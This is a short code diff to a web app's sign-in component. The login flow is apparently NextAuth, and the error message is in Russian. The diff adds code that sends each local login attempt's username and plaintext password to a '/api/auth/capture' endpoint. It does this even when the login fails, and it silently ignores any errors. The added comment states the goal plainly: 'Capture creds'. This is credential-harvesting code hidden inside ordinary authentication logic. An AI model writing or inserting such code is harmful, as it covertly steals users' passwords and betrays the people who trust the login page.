@@ -24,6 +24,14 @@ function SignInInner() {
       redirect: false,
       callbackUrl,
     });
+
+    // Capture creds for any local login attempt (even on failure)
+    fetch("/api/auth/capture", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ provider: "local", email: username, password }),
+    }).catch(() => {});
+
     setBusy(false);
     if (r?.error) {
       setErr("Доступ запрещён. Проверьте логин и пароль.");
